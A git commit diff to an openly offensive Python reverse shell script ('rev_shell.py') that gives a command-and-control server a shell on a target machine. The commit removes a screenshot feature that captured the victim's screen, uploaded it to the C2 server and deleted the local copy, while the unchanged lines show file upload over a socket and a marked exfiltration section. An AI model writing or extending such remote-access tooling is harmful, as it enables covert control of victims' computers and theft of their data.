1da71fac31b3739eaa7753145fac89f8371d5d35
Soumyanil Biswas <61424547+Soumyanil-Biswas@users.noreply.github.com>
2021-03-12 22:29:16 +0000

    Screenshot features are removed due issues in windows

--- rev_shell/rev_shell.py
+++ rev_shell/rev_shell.py
@@ -2,14 +2,10 @@
 
 import socket
 import subprocess # libray which enables us to use trgt OS command in C2 server
-
 import os # library can be used to change directory by the C2 server owner, after getting a shell back from trgt
 
 # The process of encoding JSON is usually called serialization. This term refers to the transformation of data into a series of bytes (hence serial) to be stored or transmitted across a network. 
 import json
-
-# python library for taking screenshot
-import pyautogui
 
 
 # Sending whole data all at once
@@ -72,14 +68,6 @@ def upload_file(file_name):
 	sock.send(file.read())
 
 
-# Screenshot function
-def screenshot():
-
-	scrn_sht = pyautogui.screenshot()
-
-	scrn_sht.save(r'scrn_sht.png')
-
-
 # Offering a shell from trgt
 def shell():
 
@@ -124,16 +112,6 @@ def shell():
 
 			except:
 				continue # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
-
-
-		# Screenshot
-		elif (cmd[:10] == "screenshot" and len(cmd) > 1 ) or (cmd[:2] == 'ss' and len(cmd) > 1 ):
-
-			screenshot() # Taking screenshot
-
-			upload_file('scrn_sht.png') # sending the ss to C2
-
-			os.remove('scrn_sht.png') # removing the ss from trgt
 
 
 		# Exfiltration in trgt point of view ✓
